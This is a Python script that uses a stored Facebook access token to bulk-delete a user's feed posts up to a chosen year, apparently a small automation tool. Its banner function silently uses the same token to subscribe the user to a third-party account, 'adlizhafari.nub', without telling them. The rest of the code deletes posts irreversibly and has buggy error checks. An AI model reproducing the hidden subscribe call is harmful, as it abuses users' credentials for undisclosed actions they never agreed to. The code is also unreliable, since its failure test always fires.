import requests,time,json
class Delpos:
	def __init__(self):
		self.req=requests.Session()
		self.ket=open('toket/token.txt','r').read()
		self.url='https://graph.facebook.com/v3.0/me?fields=feed&access_token='+self.ket
		self.banner()

	def banner(self):
		fol=self.req.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+self.ket)
		print("""
		;;;;;;;;;;;;;;;;
		; Deleted Post ;
		;;;;;;;;;;;;;;;;
		""")
		t=time.ctime().split(' ')
		self.in_time=input('[info] enter to delete all post\n[?] YEAR: ')
		if self.in_time == '':
			self.in_time=t[4]
		self.getinf(self.url)

	def getinf(self,inf):
		rr=self.req.get(inf)
		try:
			js=json.loads(rr.text)['feed']
		except KeyError:
			js=json.loads(rr.text)
		for x in js['data']:
			time=str(x['created_time']).split('-')
			if time[0] <= self.in_time:
				dell=self.req.delete('https://graph.facebook.com/v3.0/'+str(x['id'])+'?&access_token='+self.ket)
				if 'true' in dell.text:
					print('[+] post_id - '+x['id']+' Deleted ('+time[0]+')')
				elif 'error' or 'false' in dell.text:
					print('[-] post_id - '+x['id']+' Failed ('+time[0]+')')
		try:
			self.getinf(js['paging']['next'])
		except: pass
Delpos()
print('[D O N E]')
